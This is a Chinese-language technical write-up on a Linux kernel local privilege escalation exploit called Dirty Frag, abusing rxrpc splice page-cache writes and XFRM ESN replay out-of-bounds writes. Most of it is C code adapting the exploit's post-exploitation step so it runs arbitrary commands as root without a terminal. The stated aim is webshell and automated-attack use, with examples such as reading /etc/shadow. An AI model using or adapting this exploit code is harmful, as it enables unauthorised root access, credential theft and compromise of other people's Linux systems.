# 一、漏洞概述

Dirty Frag 是一个针对 Linux 内核的本地提权漏洞，该漏洞影响自2017年以来的主流Linux发行版本，运行任何本地用户获取root权限。
该漏洞主要利用 `rxrpc`/`rxkad` 子系统中 `splice`+`vmsplice` 组合触发的页缓存写原语，以及 XFRM/ESP 子系统中 ESN replay 状态字段越界写入。利用者通过构造恶意网络包，诱导内核将攻击者控制的数据解密后**直接写入目标文件的 page cache**，从而实现无文件修改痕迹的任意页缓存覆写。

受影响内核版本：大致为 5.x ~ 6.8 的 Linux 内核，且需要 `rxrpc` 和 `AF_ALG` 支持。
## 二、原始POC：交互式 PTY Shell

exp 成功后，原代码通过 `run_root_pty()` 启动一个 PTY（伪终端），在该 PTY 内执行 `su -`，然后将用户的终端与之桥接：

```c
// 原始 exp.c:1809-1893 — run_root_pty()
int master = posix_openpt(O_RDWR | O_NOCTTY);  // 创建 master PTY
// ...
pid_t pid = fork();
if (pid == 0) {
    // 子进程：slave PTY 作为 su 的 stdin/stdout/stderr
    setsid();
    int slave = open(slave_name, O_RDWR);
    ioctl(slave, TIOCSCTTY, 0);
    dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
    exec_su_login();  // 执行 "su -"
}
// 父进程：桥接用户 TTY ←→ master PTY
// 在 poll() 循环中转发键盘输入和命令输出
```

这在终端环境下工作良好，但在以下场景完全不可用：

- **Webshell 环境**：没有 TTY，PTY 创建失败或静默退出
- **CI/CD 管道**：非 TTY stdin，无法交互
- **自动化利用脚本**：需要程序化地执行命令、获得输出、退出

---

# 三、修改目标：`./exp "id"` 一行命令执行

需要达到的效果：

```bash
$ ./exp "id"
[+] ESP corruption succeeded
uid=0(root) gid=0(root) groups=0(root)
$ ./exp "cat /etc/shadow | head -2"
root::0:0:root:/root:/bin/bash
...
```

要求：**无 TTY、无交互、一条命令执行完即退出，stdout 直接输出结果**。

---

# 四、修改实现

### 4.1 核心思路

两条路径都使 `su` 获取 root：
- **ESP 路径**：`su` 被替换为新 ELF → 直接 `execve("/bin/sh")` → root shell
- **rxrpc 路径**：passwd 空密码 + PAM nullok → `su` 免密登录 → root shell

无论哪条路径，最终 `su` 都会掉入一个 root shell。我们只需：
1. 将命令写到 `su` 的 **stdin** 中
2. 在命令末尾追加 `exit\n` 使 shell 执行完退出
3. 父进程等待子进程结束，不桥接任何 TTY

### 4.2 新增 `run_root_cmd()` 函数

在 `exp.c:1776-1804` 位置添加：

```c
static int run_root_cmd(const char *cmd)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;

    pid_t p = fork();
    if (p < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }

    if (p == 0) {
        // 子进程：stdin 从 pipe 读取，执行 su
        close(pipefd[1]);
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);
        // 尝试各种可能的 su 路径
        const char *paths[] = {
            "/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
        };
        for (int i = 0; paths[i]; i++)
            execl(paths[i], "su", NULL);
        execlp("su", "su", NULL);
        _exit(127);
    }

    // 父进程：向 pipe 写入命令 + exit
    close(pipefd[0]);
    dprintf(pipefd[1], "%s\nexit\n", cmd);
    close(pipefd[1]);

    int status;
    waitpid(p, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}
```

**设计要点**：

| 问题                                  | 解法                                                    |
| ----------------------------------- | ----------------------------------------------------- |
| ESP 路径的 `su` 已变成只执行 `/bin/sh` 的 ELF | `sh` 从 stdin 读取命令，`cmd\nexit\n` 直接送给 shell            |
| rxrpc 路径的 `su` 可能提示密码               | PAM nullok + 空密码字段会**跳过密码提示**，stdin 直接被 root shell 读取 |
| 需要捕获命令输出                            | 子进程继承父进程的 stdout/stderr，直接输出到终端                       |
| 需要命令执行完退出                           | `exit\n` 使 shell 退出，`waitpid` 等待子进程终止                 |

### 4.3 修改 `main()` 命令解析

在 `exp.c:1933-1998` 处修改：

```c
int main(int argc, char **argv)
{
    // ... 原有变量声明 ...
    char *run_cmd = NULL;  // 新增

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--force-esp"))
            force_esp = 1;
        else if (!strcmp(argv[i], "--force-rxrpc"))
            force_rxrpc = 1;
        else if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            verbose = 1;
        else if (argv[i][0] != '-')      // 新增：非 flag 参数视为命令
            run_cmd = argv[i];
    }

    if (getuid() == 0) {                 // 新增：已在 root 时直接执行
        if (run_cmd) {
            execlp("/bin/sh", "sh", "-c", run_cmd, NULL);
            _exit(1);
        }
        execlp("/bin/bash", "bash", (char *)NULL);
        _exit(1);
    }

    // ... 原有提权逻辑不变 ...

    if (patched) {                       // 修改后的分支
        if (run_cmd)
            return run_root_cmd(run_cmd);  // 非交互执行
        (void)run_root_pty();              // 原有交互 shell（兼容）
        return 0;
    }
    // ...
}
```

**向后兼容**：
- `./exp` — 不传命令，仍走原有 `run_root_pty()` 交互 shell
- `./exp "id"` — 传入命令，走新增 `run_root_cmd()` 非交互模式
- `./exp --force-rxrpc "cat /etc/shadow"` — 强制 rxrpc 路径 + 命令
- 所有原有 flag（`-v`、`--verbose`、`--force-esp`、`--force-rxrpc`）均保留

---

## 五、编译与使用

```bash
# 编译
gcc -s -o exp exp.c

# 交互式 shell（原有功能）
./exp

# 非交互命令执行（新功能）
./exp "id"
./exp "whoami"
./exp "cat /etc/shadow"
./exp "ping -c 1 10.0.0.1"

# 强制指定攻击路径
./exp --force-esp "id"
./exp --force-rxrpc "id"
```

---

### 与原始 PTY 方式的对比

| 特性 | PTY 方式（原始） | Pipe 方式（修改后） |
|---|---|---|
| 需要 TTY | 是 | 否 |
| 适用场景 | 交互式终端 | Webshell, CI, 脚本 |
| 命令执行 | 手动输入 | 参数传入 |
| 输出获取 | stdout（带 tty 转义） | 纯 stdout |
| 退出方式 | `exit` 或 Ctrl+D | `exit\n` 自动注入 |
| 多命令支持 | 逐条手打 | `id; whoami; ls -la` |

---

## 六、参考

- Dirty Frag 原始代码：利用 XFRM ESN replay 越界 + rxrpc splice 页缓存覆写
- PAM nullok 机制：`security/pam/modules/pam_unix/pam_unix_auth.c`
- `pcbc(fcrypt)` 用户态暴力破解：基于 Linux 内核 `crypto/fcrypt.c` 移植
